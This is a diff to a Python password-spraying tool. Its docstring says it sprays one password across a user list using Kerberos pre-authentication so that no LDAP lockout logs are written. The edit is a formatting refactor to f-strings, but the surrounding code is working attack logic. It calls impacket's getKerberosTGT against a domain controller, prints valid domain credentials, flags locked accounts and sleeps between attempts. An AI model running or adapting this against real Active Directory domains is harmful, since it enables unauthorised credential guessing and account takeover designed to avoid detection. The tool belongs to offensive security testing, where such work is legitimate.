@@ -1,5 +1,4 @@
 """Kerberos-based password spray — no LDAP lockout logs, pre-auth only."""
-from __future__ import annotations
 import sys
 import time
 from typing import Any
@@ -27,7 +26,7 @@ def run(args: Any) -> int:
     with open(users_file) as f:
         users = [l.strip() for l in f if l.strip()]
 
-    print("[*] Kerberos spray: {} (1 password × {} users)".format(dc_ip, len(users)))
+    print(f"[*] Kerberos spray: {dc_ip} (1 password × {len(users)} users)")
 
     try:
         from impacket.krb5.kerberosv5 import getKerberosTGT
@@ -45,20 +44,20 @@ def run(args: Any) -> int:
                 user_name, password, args.domain,
                 None, None, None, dc_ip)
             valid.append(user)
-            print("[+] VALID: {}\\{} : {}".format(args.domain, user, password))
+            print(f"[+] VALID: {args.domain}\\{user} : {password}")
         except Exception as exc:
             err = str(exc)
             if "KDC_ERR_PREAUTH_FAILED" in err:
                 pass
             elif "KDC_ERR_CLIENT_REVOKED" in err:
-                print("[!] LOCKED/DISABLED: {}".format(user))
+                print(f"[!] LOCKED/DISABLED: {user}")
             elif "KDC_ERR_C_PRINCIPAL_UNKNOWN" in err:
                 pass
             else:
-                print("  [-] {} — {}".format(user, err[:60]))
+                print(f"  [-] {user} — {err[:60]}")
 
         if delay:
             time.sleep(delay)
 
-    print("\n[*] Result: {}/{} valid".format(len(valid), len(users)))
+    print(f"\n[*] Result: {len(valid)}/{len(users)} valid")
     return 0 if valid else 1
